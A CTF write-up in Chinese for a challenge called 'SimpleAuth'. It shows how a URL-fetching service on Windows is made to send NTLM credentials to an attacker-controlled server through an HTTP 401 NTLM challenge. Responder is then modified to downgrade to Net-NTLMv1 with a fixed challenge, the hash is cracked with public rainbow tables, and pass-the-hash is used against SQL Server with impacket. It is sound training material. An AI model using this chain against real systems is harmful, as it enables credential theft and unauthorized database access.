# SimpleAuth

## 题目简述

题目提供一个只允许 `http` URL 的请求入口。服务端访问用户提供的 URL 时运行在 Windows 环境中，可被攻击者控制的 HTTP 响应诱导进行 NTLM 认证。解题目标是通过 HTTP 401 `WWW-Authenticate: NTLM` 捕获 Net-NTLMv1，强制降级去掉 SSP 后转换出 NTLM Hash，再对开放的 SQL Server 执行 pass-the-hash 连接获取 flag。

## 解题过程

打开题目，首先提示输入url参数

```text
>> input your url.
```

输入url参数后，提示只支持http协议。

```text
>> only support http protocol.
```

构造url请求自己vps的http端口，可以成功收到http请求。

VPS HTTP 端口能收到类似下面的请求，说明服务端会主动访问用户提交的 URL：

```http
GET / HTTP/1.1
Host: <callback-host>
```

响应正常http时，页面显示nothing，接着可以尝试修改http响应包进行测试，比如返回401认证。

```php
<?php
    header('WWW-Authenticate: Basic realm="test"');
    header('HTTP/1.0 401 Unauthorized');
?>
```
Basic 认证会返回不支持该认证类型。

当响应401认证时，页面的内容发现了变化，提示不支持该认证类型。通过查阅资料得知HTTP支持Basic、Digest、NTLM等认证类型，从网站信息中得知网站为Windows服务器。尝试响应NTLM类型的401认证。

```php
<?php
    header('WWW-Authenticate: NTLM');
    header('HTTP/1.0 401 Unauthorized');
?>
```
重新请求发现响应内容发现了变化。
页面提示开始使用 Windows auth 处理请求，说明 `WWW-Authenticate: NTLM` 被目标接受。

通过tcpdump抓包可以看到，当http响应头要求NTLM认证时，题目会通过http NTLM认证再次请求url。

抓包中可以看到带 `NTLMSSP` 的 `Authorization` 头。

此时可以通过Responder工具模拟http认证，抓取Windows NTLM认证的Net-NTLM Hash。

```plain
python Responder.py -I eth0
```
再次请求，Responder接收到了Net-NTLM v1协议，包括了用户名及Net-NTLM v1 Hash。

从tcpdump流量可以分析出，NTLM协议开启了SSP，加密算法计算更为复杂导致破解难度加大。

 为了拿到NTLM Hash，可以通过Responder -lm参数强制降级，关闭NTLM SSP。

 但Responder的lm参数在实现上只支持了smb协议，需要修改packets.py脚本手动支持http协议。

 Net-NTLM Hash 破解文章的关键点是：NTLMv1 响应本质上是用 NTLM Hash 派生出的 3 个 DES key 加密 8 字节 Server Challenge；当 Server Challenge 可控且使用常见值 `1122334455667788` 时，可以借助已有彩虹表把 Net-NTLMv1 响应还原为 NTLM Hash。原文可作为协议细节参考： [NTLMv1 Hash 破解说明](https://daiker.gitbook.io/windows-protocol/ntlm-pian/6)

修改 Responder 的 HTTP NTLM 响应逻辑，把 `ServerChallenge` 固定为 `1122334455667788`，并禁用或避免 SSP 标志位。

再次请求，成功获取无SSP加密的Net-NTLM v1 Hash。

由于NTLMv1算法的缺陷，可以通过哈希碰撞的方式将NetNTLMv1 Hash还原成NTLM Hash。

NTLMv1算法计算中会生成一个随机Server Challenge并用在后续的哈希计算中，可以通过Responder工具指定Server Challenge从而更利于哈希碰撞。

Responder默认Challenge为 `1122334455667788` 。

国外网站 `crack.sh` 已经把Challenge为 `1122334455667788` 的所有彩虹表都跑出来了，直接通过网站解密即可拿到NTLM Hash。

提交解密后过一会就收到了解密成功的邮件，成功将Net-NTLM v1 Hash解密为NTLM Hash。

接下来是 pass the hash 利用。扫描题目主机端口，发现开放 SQL Server 1433 端口，通过 impacket 的 `mssqlclient.py` 脚本进行 PTH 连接，以 `sqluser` 用户身份连接数据库，即可拿到 flag。

```plain
python mssqlclient.py sqluser@<target-host> -hashes :<ntlm-hash> -windows-auth
```

## 方法总结

- 核心技巧：SSRF/URL fetcher 遇到 Windows 出网环境时，可通过 HTTP NTLM 认证诱导获取 Net-NTLM；降级到 Net-NTLMv1 后再用固定 challenge 彩虹表还原 NTLM Hash。
- 识别信号：URL 参数只允许 HTTP、服务端能访问攻击者 HTTP 服务、响应 401 后行为变化、目标环境是 Windows，这些信号应联想到 NTLM relay/hash capture。
- 复用要点：Responder 默认更偏 SMB 场景，HTTP 降级需要确认 `WWW-Authenticate: NTLM`、challenge 和 SSP 标志；后续利用看目标开放服务，SQL Server 可用 impacket `mssqlclient.py -windows-auth -hashes` 做 PTH。
